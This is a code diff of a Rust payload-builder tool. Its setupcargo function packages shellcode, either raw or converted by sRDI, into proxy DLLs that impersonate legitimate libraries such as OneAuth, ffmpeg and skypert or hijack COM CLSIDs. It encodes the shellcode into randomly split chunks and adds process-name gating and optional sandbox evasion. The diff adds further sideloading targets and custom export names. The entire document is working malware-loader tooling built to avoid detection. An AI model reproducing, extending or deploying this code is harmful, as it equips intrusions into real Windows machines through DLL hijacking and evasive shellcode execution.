@@ -2,21 +2,40 @@
 mod srdi;
 use rand::Rng;
 use rand::prelude::SliceRandom;
-use std::fs::{self, OpenOptions, File};
+use std::fs::{self, File};
 use std::io::{Read, Write};
 use my_lib::{
-    code_snippet, main_imports, maincargo, auxcargo, sandboximports, sandboxstruct, proceesnamestruct, OneAuth, Ffmpegg, Skpert, BuildScript, SlimCV, ExplorerFrame, FastProx, Mssprxy, Netprofm, Npmproxy, OneCoreCommonProxyStub, Propsys, Stobject, Wbemprox, WebplatStorageServer, WindowsStateRepositoryPS, WindowsStorage, Wpnapps};
+    code_snippet, main_imports, maincargo, auxcargo, sandboximports, sandboxstruct, proceesnamestruct, OneAuth, Ffmpegg, Skpert, BuildScript, SlimCV, ExplorerFrame, FastProx, Mssprxy, Netprofm, Npmproxy, OneCoreCommonProxyStub, Propsys, Stobject, Wbemprox, WebplatStorageServer, WindowsStateRepositoryPS, WindowsStorage, Wpnapps, domain_actions, well_known_domains, cargo_config_toml, rust_toolchain_toml, generate_encoded_shellcode};
 use std::process::Command;
 
-pub fn setupcargo(shellcodefile: &str, project_name: &str, dll_mode: &str, buildtype: &str, sandbox: bool, def_file: &str) -> (String, String) {
-    let output = Command::new("cargo").args(&["new", project_name]).output().expect("Failed to create a new Rust project");
-    println!("[*] Created new Rust project: {}", project_name);
+pub fn setupcargo(shellcodefile: &str, project_name: &str, _dll_mode: &str, buildtype: &str, sandbox: bool, def_file: &str, export_name_arg: &str, word_at_end: bool) -> (String, String) {
+    let _output = Command::new("cargo").args(&["new", project_name]).output().expect("Failed to create a new Rust project");
+
     let cargo_toml_path = format!("{}/Cargo.toml", project_name);
     let mut cargo_toml = std::fs::OpenOptions::new().append(true).open(cargo_toml_path).expect("Failed to open Cargo.toml");
-    let mut main_dependency = format!(r#"{}"#, maincargo(),);
-    srdi(shellcodefile);
-    let project_shellcode = format!("{}/stuff.bin", project_name);
-    fs::rename("stuff.bin", project_shellcode).expect("Failed to rename shellcode file");
+    let main_dependency = format!(r#"{}"#, maincargo(),);
+    let is_shellcode = shellcodefile.ends_with(".bin");
+
+    let shellcode_data = if is_shellcode {
+        println!("[*] Raw shellcode input detected: {}", shellcodefile);
+        fs::read(shellcodefile).expect("[!] Failed to read shellcode file")
+    } else {
+        if export_name_arg != "" {
+            srdi(shellcodefile, export_name_arg);
+            println!("[*] Export name: {}", export_name_arg);
+        } else {
+            srdi(shellcodefile, "DllMain");
+        }
+        let data = fs::read("stuff.bin").expect("Failed to read stuff.bin");
+        fs::remove_file("stuff.bin").ok();
+        data
+    };
+    println!("[*] Shellcode size: {} bytes", shellcode_data.len());
+
+    // Generate encoded chunks (split into 5-8 chunks randomly)
+    let num_chunks = 5 + (rand::thread_rng().gen::<usize>() % 4); // 5-8 chunks
+
+    let (const_arrays, decode_calls) = generate_encoded_shellcode(&shellcode_data, num_chunks);
 
     // Exports and building dependencies
     let exports_path = format!("{}/exports.def", project_name);
@@ -127,17 +146,29 @@ pub fn setupcargo(shellcodefile: &str, project_name: &str, dll_mode: &str, build
     // Handle other as usual
     // DLL proxy targets
     else if project_name == "OneAuth" {
-        updated_content = format!(r#"{}"#, OneAuth());
-        let _new_word = format!("OneAuth-old");
-    } else if project_name == "ffmpegg" {
+        export_content = format!(r#"{}"#, OneAuth());
+        let replacement = if word_at_end { format!("OneAuth-{}", new_word) } else { format!("{}-OneAuth", new_word) };
+        updated_content = export_content.replace("old-OneAuth", &replacement);
+    } else if project_name == "ffmpeg" {
         export_content = format!(r#"{}"#, Ffmpegg());
-        updated_content = export_content.replace("old-ffmpegg", &format!("{}-ffmpegg", new_word));
+        let replacement = if word_at_end { format!("ffmpeg-{}", new_word) } else { format!("{}-ffmpeg", new_word) };
+        updated_content = export_content.replace("old-ffmpeg", &replacement);
     } else if project_name == "skypert" {
         export_content = format!(r#"{}"#, Skpert());
-        updated_content = export_content.replace("old-skypert", &format!("{}-skypert", new_word));
+        let replacement = if word_at_end { format!("skypert-{}", new_word) } else { format!("{}-skypert", new_word) };
+        updated_content = export_content.replace("old-skypert", &replacement);
     } else if project_name == "SlimCV" {
         export_content = format!(r#"{}"#, SlimCV());
-        updated_content = export_content.replace("old-SlimCV", &format!("{}-SlimCV", new_word));
+        let replacement = if word_at_end { format!("SlimCV-{}", new_word) } else { format!("{}-SlimCV", new_word) };
+        updated_content = export_content.replace("old-SlimCV", &replacement);
+    } else if project_name == "domain_actions" {
+        export_content = format!(r#"{}"#, domain_actions());
+        let replacement = if word_at_end { format!("domain_actions-{}", new_word) } else { format!("{}-domain_actions", new_word) };
+        updated_content = export_content.replace("old-domain_actions", &replacement);
+    } else if project_name == "well_known_domains" {
+        export_content = format!(r#"{}"#, well_known_domains());
+        let replacement = if word_at_end { format!("well_known_domains-{}", new_word) } else { format!("{}-well_known_domains", new_word) };
+        updated_content = export_content.replace("old-well_known_domains", &replacement);
     // COM targets
     } else if project_name == "mssprxy" || project_name == "SearchProtocolHost" || project_name == "ms-teamsupdate" || project_name == "PhoneExperienceHost" {
         export_content = format!(r#"{}"#, Mssprxy());
@@ -162,7 +193,7 @@ pub fn setupcargo(shellcodefile: &str, project_name: &str, dll_mode: &str, build
         export_content = format!(r#"{}"#, Wpnapps());
         com_string = "{6DB7CD52-E3B7-4ECC-BB1F-388AEEF6BB50}";
     }
-      if buildtype == "DLL" {
+      if buildtype == "DLL" && !updated_content.is_empty() {
         export_content = updated_content;
     }
     exports_file.write_all(export_content.as_bytes()).expect("Failed to write to file");
@@ -177,16 +208,56 @@ pub fn setupcargo(shellcodefile: &str, project_name: &str, dll_mode: &str, build
     let compileflags = format!(r#"{}"#, auxcargo(),);
     let mut dependency = format!("{}{}", main_dependency, compileflags);
     writeln!(cargo_toml, "{}", dependency).expect(" [!] Failed to write to Cargo.toml");
-    println!("[*] Added dependency to Cargo.toml");
-    let mut main_rs_path = format!("{}/src/main.rs", project_name);
+
+    // Create .cargo directory and config.toml with Windows build optimizations
+    let cargo_dir_path = format!("{}/.cargo", project_name);
+    fs::create_dir_all(&cargo_dir_path).expect("[!] Failed to create .cargo directory");
+    let cargo_config_path = format!("{}/.cargo/config.toml", project_name);
+    let mut cargo_config = File::create(&cargo_config_path).expect("[!] Failed to create .cargo/config.toml");
+    cargo_config
+        .write_all(cargo_config_toml().as_bytes())
+        .expect("[!] Failed to write to .cargo/config.toml");
+
+    // Create rust-toolchain.toml to pin Rust version to 1.85.0
+    let rust_toolchain_path = format!("{}/rust-toolchain.toml", project_name);
+    let mut rust_toolchain = File::create(&rust_toolchain_path).expect("[!] Failed to create rust-toolchain.toml");
+    rust_toolchain
+        .write_all(rust_toolchain_toml().as_bytes())
+        .expect("[!] Failed to write to rust-toolchain.toml");
+    
+    let main_rs_path = format!("{}/src/main.rs", project_name);
 
 
     let mut main_rs_content = format!(r#"{}"#, code_snippet());
+    
+    // Extract target DLL name from exports.def for DLL proxy projects
+    if buildtype == "DLL" && (project_name == "OneAuth" || project_name == "ffmpeg" || project_name == "skypert" || project_name == "SlimCV" || project_name == "domain_actions" || project_name == "well_known_domains") {
+        let target_dll_name = if project_name == "OneAuth" {
+            if word_at_end { format!("OneAuth-{}", new_word) } else { format!("{}-OneAuth", new_word) }
+        } else if project_name == "ffmpeg" {
+            if word_at_end { format!("ffmpeg-{}", new_word) } else { format!("{}-ffmpeg", new_word) }
+        } else if project_name == "skypert" {
+            if word_at_end { format!("skypert-{}", new_word) } else { format!("{}-skypert", new_word) }
+        } else if project_name == "SlimCV" {
+            if word_at_end { format!("SlimCV-{}", new_word) } else { format!("{}-SlimCV", new_word) }
+        } else if project_name == "domain_actions" {
+            if word_at_end { format!("domain_actions-{}", new_word) } else { format!("{}-domain_actions", new_word) }
+        } else if project_name == "well_known_domains" {
+            if word_at_end { format!("well_known_domains-{}", new_word) } else { format!("{}-well_known_domains", new_word) }
+        } else {
+            "unknown".to_string()
+        };
+        // Replace placeholder with actual target DLL name
+        main_rs_content = main_rs_content.replace("TARGET_DLL_NAME_PLACEHOLDER", &target_dll_name);
+        println!("[*] Target DLL name set to: {}.dll", target_dll_name);
+    }
+    
     if buildtype == "Process" {
         println!("[*] Adding Process check");
         let template = format!(r#"{}"#, proceesnamestruct());
         let value = project_name;
-        let updated_template = template.replace("PLACEHOLDER1", value);
+        let value = value.to_lowercase();
+        let updated_template = template.replace("PLACEHOLDER1", value.as_str());
         main_rs_content = format!("{}\n{}", main_rs_content, updated_template);
         println!("[+] DLL will only run under {}.exe", value);
     }
@@ -207,11 +278,17 @@ pub fn setupcargo(shellcodefile: &str, project_name: &str, dll_mode: &str, build
         println!("[*] Sandbox evasion not enabled...");
     }
     let mut combined_code = format!("{}{}\n{}\n{}", main_rs_imports, main_rs_decryption_imports, main_rs_content, main_rs_decryption);
+    
+    // Replace placeholders with encoded shellcode chunks
+    combined_code = combined_code.replace("SHELLCODE_CONST_ARRAYS_PLACEHOLDER", &const_arrays);
+    combined_code = combined_code.replace("SHELLCODE_DECODE_CALLS_PLACEHOLDER", &decode_calls);
+
+    
     let mut main_rs = File::create(main_rs_path).expect("Failed to open main.rs");
     main_rs.write_all(combined_code.as_bytes()).expect("[!] Failed to write to main.rs");
     let old_file_name = format!("{}/src/main.rs", project_name);
     let new_file_name = format!("{}/src/lib.rs", project_name);
-    fs::rename(old_file_name, new_file_name);
+    fs::rename(old_file_name, new_file_name).expect("Failed to rename generated main.rs to lib.rs");
     (new_word.to_string(), com_string.to_string())
 }
 
@@ -220,7 +297,7 @@ fn random_word() -> &'static str {
     words.choose(&mut rand::thread_rng()).unwrap_or(&"default")
 }
 
-pub fn srdi(shellcodefile: &str){
+pub fn srdi(shellcodefile: &str, export: &str) {
     println!("[*] Starting SRDI processing of {} ", shellcodefile);
-    srdi::create_srdi_payload(shellcodefile, "DllMain")
+    srdi::create_srdi_payload(shellcodefile, export)
 }
